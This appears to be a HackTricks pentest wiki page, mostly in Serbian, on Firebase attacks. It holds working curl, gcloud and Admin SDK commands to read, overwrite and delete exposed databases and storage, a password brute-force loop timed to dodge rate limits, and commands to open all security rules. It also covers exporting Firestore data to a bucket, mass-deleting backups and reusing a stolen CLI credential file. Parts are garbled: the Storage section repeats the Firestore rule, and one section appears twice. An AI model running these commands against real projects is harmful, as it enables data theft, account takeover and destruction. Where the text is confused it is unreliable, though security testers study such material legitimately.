# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Neautentifikovan pristup Firebase Realtime Database
Napadaču nisu potrebna posebna Firebase dozvola da izvede ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Firebase Realtime Database bezbednosnim pravilima, gde su pravila podešena na `.read: true` ili `.write: true`, omogućavajući javni pristup za čitanje ili pisanje.

Napadač mora identifikovati URL baze podataka, koji obično ima format: `https://<project-id>.firebaseio.com/`.

Ovaj URL može se naći kroz mobile application reverse engineering (decompiling Android APKs ili analizom iOS aplikacija), analizom konfiguracionih fajlova kao što su google-services.json (Android) ili GoogleService-Info.plist (iOS), pregledom izvornog koda web aplikacija, ili analizom mrežnog saobraćaja da bi se identifikovali zahtevi ka `*.firebaseio.com` domenima.

Napadač identifikuje URL baze podataka i proverava da li je javno izložen, zatim pristupa podacima i potencijalno upisuje maliciozne informacije.

Prvo, proveravaju da li baza dozvoljava čitanje dodavanjem .json na URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Ako odgovor sadrži JSON ili null (umesto "Permission Denied"), baza podataka dozvoljava read access. Da bi proverio write access, attacker može pokušati da pošalje test write request koristeći Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Ako operacija uspe, baza podataka takođe dozvoljava pristup za pisanje.

### Izlaganje podataka u Cloud Firestore
Napadaču nisu potrebne posebne Firebase dozvole da bi izvršio ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u bezbednosnim pravilima Cloud Firestore gde pravila dozvoljavaju pristup za čitanje ili pisanje bez autentifikacije ili sa nedovoljnom validacijom. Primer pogrešno konfigurisanog pravila koje daje potpuni pristup je:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ovo pravilo omogućava bilo kome da čita i piše sve dokumente bez ikakvih ograničenja. Firestore pravila su granularna i primenjuju se po kolekciji i dokumentu, tako da greška u određenom pravilu može izložiti samo određene kolekcije.

Napadač mora identifikovati Firebase Project ID, koji se može pronaći kroz mobile app reverse engineering, analizu konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, inspekcijom izvornog koda web aplikacija, ili analizom mrežnog saobraćaja kako bi se identifikovali zahtevi prema firestore.googleapis.com.
Firestore REST API koristi format:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ako pravila dozvoljavaju neautentifikovan pristup za čitanje, napadač može да pročita kolekcije и dokumente. Prvo pokušaju da pristupe određenoj kolekciji:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Ako odgovor sadrži JSON documents umesto greške dozvole, collection je izložena. attacker može enumerate sve dostupne collections pokušavajući uobičajena imena ili analizom strukture aplikacije. Za pristup određenom documentu:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ako pravila dozvoljavaju unauthenticated write access ili imaju nedovoljnu validaciju, napadač može kreirati nove dokumente:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Za izmenu postojećeg dokumenta treba koristiti PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Da biste izbrisali dokument i prouzrokovali uskraćivanje usluge:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Izlaganje fajlova u Firebase Storage
Napadaču nisu potrebne posebne Firebase dozvole da bi izveo ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Firebase Storage security rules u kojoj pravila dozvoljavaju read ili write access bez authentication ili sa nedovoljnom validation. Storage rules kontrolišu read i write permissions nezavisno, tako da greška u rule može izložiti samo read access, samo write access ili oba. Primer pogrešno konfigurisanog pravila koje daje potpuni pristup je:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ovo pravilo omogućava pristup za čitanje i pisanje svim dokumentima bez ikakvih ograničenja. Firestore pravila su granularna i primenjuju se po kolekciji i po dokumentu, tako da greška u određenom pravilu može izložiti samo određene kolekcije. Napadač mora identifikovati Firebase Project ID, koji se može pronaći putem mobile application reverse engineering, analizom konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, pregledom izvornog koda web aplikacije, ili network traffic analysis kako bi se identifikovali zahtevi prema firestore.googleapis.com.
The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Ako pravila dozvoljavaju neautentifikovan pristup za čitanje, napadač može da čita kolekcije i dokumente. Prvo pokušaju da pristupe određenoj kolekciji.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Ako odgovor sadrži listu fajlova umesto greške pristupa, fajl je izložen. Napadač može da pregleda sadržaj fajlova navođenjem njihovog puta:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Ako pravila dozvoljavaju neautentifikovan write access ili imaju nedovoljnu validaciju, napadač može uploadovati maliciozne fajlove. Za upload fajla preko REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Napadač može otpremiti code shells, malware payloads ili velike datoteke da bi prouzrokovao denial of service. Ako aplikacija obrađuje ili izvršava otpremljene datoteke, napadač može ostvariti remote code execution. Da bi izbrisao datoteke i prouzrokovao denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Pozivanje javnih Firebase Cloud Functions
Napadaču nisu potrebna nikakva specifična Firebase ovlašćenja da bi iskoristio ovaj problem; dovoljno je da je Cloud Function javno dostupna preko HTTP-a bez autentifikacije.

Funkcija je ranjiva kada je nesigurno konfigurisana:

- Koristi `functions.https.onRequest`, koji ne nameće autentifikaciju (za razliku od `onCall` functions).
- Kod funkcije ne verifikuje autentifikaciju korisnika (npr. nema provera za `request.auth` ili `context.auth`).
- Funkcija je javno dostupna u IAM-u, što znači da `allUsers` ima ulogu `roles/cloudfunctions.invoker`. Ovo je podrazumevano ponašanje za HTTP functions osim ako developer ne ograniči pristup.

Firebase HTTP Cloud Functions su izložene putem URL-ova kao što su:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

Napadač može otkriti ove URL-ove analizom izvornog koda, inspekcijom mrežnog saobraćaja, alatima za enumeraciju, ili reverznim inženjeringom mobilne aplikacije.
Ako je funkcija javno izložena i bez autentifikacije, napadač je može direktno pozvati bez kredencijala.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Ako funkcija ne validira ulaze ispravno, napadač može pokušati i druge napade kao što su code injection ili command injection.

### Brute-force napad protiv Firebase Authentication sa slabom politikom lozinki
Napadaču nisu potrebna posebna Firebase ovlašćenja da izvede ovaj napad. Potrebno je samo da je Firebase API Key izložen u mobilnim ili web aplikacijama i da politika lozinki nije podešena sa strožijim zahtevima od podrazumevanih.

Napadač mora identifikovati Firebase API Key, koji se može pronaći reverznim inženjeringom mobilnih aplikacija, analizom konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, pregledom izvornog koda web aplikacija (npr. u bootstrap.js) ili analizom mrežnog saobraćaja.

Firebase Authentication’s REST API koristi endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
za autentifikaciju putem emaila i lozinke.

Ako je Email Enumeration Protection onemogućen, API odgovori sa greškama mogu otkriti da li email postoji u sistemu (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), što omogućava napadačima da izvrše enumeraciju korisnika pre pokušaja pogađanja lozinke. Kada je ova zaštita omogućena, API vraća istu poruku o grešci i za nepostojeće emailove i za netačne lozinke, sprečavajući enumeraciju korisnika.

Važno je napomenuti da Firebase Authentication primenjuje rate limiting, koji može blokirati zahteve ako dođe do previše pokušaja autentifikacije u kratkom vremenu. Zbog toga napadač mora uvoditi kašnjenja između pokušaja da izbegne rate-limiting.

Napadač identifikuje API Key i izvršava pokušaje autentifikacije sa više lozinki protiv poznatih naloga. Ako je Email Enumeration Protection onemogućen, napadač može enumerisati postojeće korisnike analizom odgovora sa greškama:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Ako odgovor sadrži EMAIL_NOT_FOUND, email ne postoji u sistemu. Ako odgovor sadrži INVALID_PASSWORD, email postoji, ali je lozinka netačna, što potvrđuje da je korisnik registrovan. Kada se identifikuje važeći korisnik, napadač može izvršiti brute-force pokušaje. Važno je uključiti pauze između pokušaja kako bi se izbegli mehanizmi ograničavanja brzine Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Sa podrazumevanom politikom lozinki (minimum 6 karaktera, bez zahteva za kompleksnost), napadač može isprobati sve moguće kombinacije lozinki od 6 karaktera, što predstavlja relativno mali prostor pretrage u poređenju sa strožijim politikama lozinki.

### Upravljanje korisnicima u Firebase Authentication

Napadaču su potrebne specifične dozvole u Firebase Authentication da bi izveo ovaj napad. Potrebne dozvole su:

- `firebaseauth.users.create` za kreiranje korisnika
- `firebaseauth.users.update` za modifikaciju postojećih korisnika
- `firebaseauth.users.delete` za brisanje korisnika
- `firebaseauth.users.get` za dobijanje informacija o korisnicima
- `firebaseauth.users.sendEmail` za slanje emailova korisnicima
- `firebaseauth.users.createSession` za kreiranje sesija korisnika

Ove dozvole su uključene u ulogu `roles/firebaseauth.admin`, koja daje potpuni pristup za čitanje i pisanje Firebase Authentication resursa. Takođe su uključene u uloge višeg nivoa kao što su roles/firebase.developAdmin (koja uključuje sve firebaseauth.* dozvole) i roles/firebase.admin (potpun pristup svim Firebase servisima).

Da bi koristio Firebase Admin SDK, napadaču bi bio potreban pristup kredencijalima servisnog naloga (JSON fajl), koji se mogu naći na kompromitovanim sistemima, javno izloženim repozitorijumima koda, kompromitovanim CI/CD sistemima, ili putem kompromitovanja developerskih naloga koji imaju pristup tim kredencijalima.

Prvi korak je konfigurisanje Firebase Admin SDK koristeći kredencijale servisnog naloga.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Da bi kreirao malicioznog korisnika koristeći e‑mail žrtve, napadač bi pokušao da upotrebi Firebase Admin SDK da generiše novi nalog pod tim e‑mailom.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Da bi izmenio postojeći korisnički nalog, napadač bi ažurirao polja kao što su adresa e-pošte, status verifikacije ili da li je nalog onemogućen.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Da bi obrisao korisnički nalog i izazvao denial of service, attacker bi poslao zahtev da u potpunosti ukloni korisnika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Napadač takođe može da dobije informacije o postojećim korisnicima tako što će zatražiti njihov UID ili email adresu.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Pored toga, napadač bi mogao generisati linkove za verifikaciju ili linkove za resetovanje lozinke kako bi promenio lozinku korisnika i dobio pristup njegovom nalogu.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Upravljanje korisnicima u Firebase Authentication
Napadač treba određene dozvole u Firebase Authentication da izvede ovaj napad. Potrebne dozvole su:

- `firebaseauth.users.create` da kreira korisnike
- `firebaseauth.users.update` da modifikuje postojeće korisnike
- `firebaseauth.users.delete` da briše korisnike
- `firebaseauth.users.get` da dobije informacije o korisniku
- `firebaseauth.users.sendEmail` da šalje emailove korisnicima
- `firebaseauth.users.createSession` da kreira korisničke sesije

Ove dozvole su uključene u ulogu roles/firebaseauth.admin, koja daje full read/write access to Firebase Authentication resources. Takođe su deo višeg nivoa uloga kao što su `roles/firebase.developAdmin` (koja uključuje sve firebaseauth.* dozvole) i `roles/firebase.admin` (full access to all Firebase services).

Da bi koristio Firebase Admin SDK, napadač bi morao da ima pristup service account credentials (a JSON file), koje se mogu dobiti iz kompromitovanih sistema, javno izloženih repozitorijuma koda, kompromitovanih CI/CD okruženja, ili kompromitacijom developerskih naloga koji imaju pristup tim kredencijalima.

Prvi korak je konfigurisanje Firebase Admin SDK koristeći service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Da bi kreirao malicioznog korisnika koristeći adresu e-pošte žrtve, napadač bi pokušao da napravi novi korisnički nalog sa tom adresom, dodeljujući sopstvenu lozinku i podatke profila.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Da bi izmenio postojećeg korisnika, napadač bi promenio polja kao što su adresa e-pošte, status verifikacije ili da li je nalog onemogućen.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Da bi obrisao korisnički nalog—efektivno izazivajući denial of service—napadač bi poslao zahtev da tog korisnika trajno ukloni.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Napadač bi takođe mogao da dobije informacije o postojećim korisnicima, kao što su njihov UID ili email, zahtevajući detalje o korisniku bilo po UID-u ili po email adresi.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Pored toga, napadač bi mogao da generiše linkove za verifikaciju ili password-reset linkove, što mu omogućava da promeni lozinku korisnika i preuzme kontrolu nad nalogom.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Izmena sigurnosnih pravila u Firebase servisima
The attacker mora imati posebne dozvole za izmenu sigurnosnih pravila, u zavisnosti od servisa. Za Cloud Firestore i Firebase Cloud Storage, potrebne dozvole su `firebaserules.rulesets.create` za kreiranje ruleset-ova i `firebaserules.releases.create` za deploy release-ova. Ove dozvole su uključene u ulogu `roles/firebaserules.admin` ili u uloge višeg nivoa kao što su `roles/firebase.developAdmin` i `roles/firebase.admin`. Za Firebase Realtime Database, potrebna dozvola je `firebasedatabase.instances.update`.

The attacker mora koristiti Firebase REST API da bi izmenio sigurnosna pravila.
Prvo, the attacker treba da dobije access token koristeći kredencijale servisnog naloga.
Da bi dobio token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Da biste izmenili pravila Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Da bi izmenio Cloud Firestore rules, napadač mora da kreira ruleset i potom ga deploy-uje:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Prethodna komanda vraća naziv ruleseta u formatu projects/<project-id>/rulesets/<ruleset-id>. Da biste deploy-ovali novu verziju, release mora biti ažuriran pomoću PATCH request-a:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Da biste izmenili pravila za Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Prethodna komanda vraća naziv ruleset-a u formatu projects/<project-id>/rulesets/<ruleset-id>. Da biste primenili novu verziju, release mora biti ažuriran pomoću PATCH zahteva:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore koristi istu infrastrukturu i sistem dozvola kao Cloud Datastore, pa Datastore IAM dozvole važe direktno za Firestore. Za manipulaciju TTL politikama potrebna je dozvola `datastore.indexes.update`. Za izvoz podataka potrebna je dozvola `datastore.databases.export`. Za uvoz podataka potrebna je dozvola `datastore.databases.import`. Za izvođenje masovnog brisanja podataka potrebna je dozvola `datastore.databases.bulkDelete`.

Za operacije pravljenja i vraćanja rezervnih kopija potrebne su sledeće dozvole:

- `datastore.backups.get` i `datastore.backups.list` za prikaz i preuzimanje detalja dostupnih rezervnih kopija
- `datastore.backups.delete` za brisanje rezervnih kopija
- `datastore.backups.restoreDatabase` za vraćanje baze podataka iz rezervne kopije
- `datastore.backupSchedules.create` i `datastore.backupSchedules.delete` za upravljanje rasporedima rezervnih kopija

Kada se kreira TTL politika, odabire se određeno svojstvo koje identifikuje entitete koji su podobni za brisanje. Ovo TTL svojstvo mora biti tipa Datum i vreme. Napadač može izabrati svojstvo koje već postoji ili odrediti svojstvo koje planira da doda kasnije. Ako je vrednost polja datum iz prošlosti, dokument postaje podoban za trenutno brisanje. Napadač može koristiti gcloud CLI za manipulaciju TTL politikama.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Za izvoz podataka i njihovu eksfiltraciju, napadač bi mogao koristiti gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Da biste uvezli zlonamerne podatke:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Da bi izvršio masovno brisanje podataka i izazvao denial of service, napadač bi mogao koristiti gcloud Firestore bulk-delete tool da ukloni cele kolekcije.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Za operacije bekapa i restauracije, napadač može kreirati zakazane bekape da bi zabeležio trenutno stanje baze podataka, navesti postojeće bekape, vratiti iz bekapa da pregazi nedavne izmene, izbrisati bekape da bi izazvao trajni gubitak podataka i ukloniti zakazane bekape.
Da biste kreirali dnevni raspored bekapa koji odmah generiše bekap:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Da bi izvršio vraćanje iz određene rezervne kopije, napadač može kreirati novu bazu podataka koristeći podatke sadržane u toj kopiji. Operacija obnavljanja upisuje podatke iz kopije u novu bazu podataka, što znači da se postojeći DATABASE_ID ne može koristiti.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Da izbrišete backup i prouzrokate trajni gubitak podataka:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Krađa i zloupotreba Firebase CLI credentials
Napadaču nisu potrebna specifična Firebase permissions da bi izveo ovaj napad, ali mu je potreban pristup lokalnom sistemu developera ili Firebase CLI credentials fajlu. Ovi credentials su pohranjeni u JSON fajlu koji se nalazi na:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Ovaj fajl sadrži authentication tokens, uključujući refresh_token i access_token, koji napadaču omogućavaju da se autentifikuje kao korisnik koji je prvobitno pokrenuo firebase login.

Napadač dobije pristup Firebase CLI credentials fajlu. Zatim može kopirati ceo fajl na svoj sistem, i Firebase CLI će automatski koristiti credentials sa svoje podrazumevane lokacije. Nakon toga, napadač može videti sve Firebase projekte kojima taj korisnik ima pristup.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
